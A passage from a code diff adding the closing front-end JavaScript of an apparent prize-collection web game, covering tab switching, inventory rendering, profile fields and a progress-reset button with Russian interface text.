+    $$('.tab-content').forEach(tc => tc.classList.remove('active'));
+    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'inventory') loadInventory();
+    if (tab.dataset.tab === 'profile') updateProfile();
+  });
+});
+
+async function loadInventory() {
+  try {
+    const data = await api('/api/inventory/' + userId);
+    const grid = $('#inventoryGrid');
+    const empty = $('#emptyInv');
+    if (!data.items.length) {
+      grid.innerHTML = '';
+      empty.style.display = 'block';
+      return;
+    }
+    empty.style.display = 'none';
+    grid.innerHTML = data.items.map(it => `
+      <div class="inv-item">
+        <div class="emoji">${it.prize_emoji}</div>
+        <div class="name">${it.prize_name}</div>
+        <div class="rarity rarity-text-${it.prize_rarity}">${it.prize_rarity}</div>
+      </div>
+    `).join('');
+  } catch (e) {}
+}
+
+async function updateProfile() {
+  try {
+    const data = await api('/api/inventory/' + userId);
+    $('#profOpened').textContent = data.items.length;
+    $('#profGifts').textContent = data.items.length;
+  } catch (e) {}
+  // phone from status
+  try {
+    const d = await api('/api/status/' + userId);
+    $('#profPhone').textContent = d.user.phone;
+  } catch (e) {}
+}
+
+// Reset button
+const resetBtn = document.getElementById('resetBtn');
+if (resetBtn) {
+  resetBtn.addEventListener('click', async () => {
+    if (!confirm('Сбросить прогресс?')) return;
+    try {
+      await api('/api/reset', { method: 'POST', body: JSON.stringify({ userId }) });
+    } catch (e) {}
+    localStorage.removeItem(LS_KEY);
+    userId = null;
+    balance = 1000;
+    $('#balance').textContent = balance;
+  localStorage.setItem('wc_balance', balance);
+    showScreen('register');
+    toast('Прогресс сброшен');
+  });
+}
+
+// ---------- Boot ----------
+runIntro();
+
+</script>
+</body>
+</html>
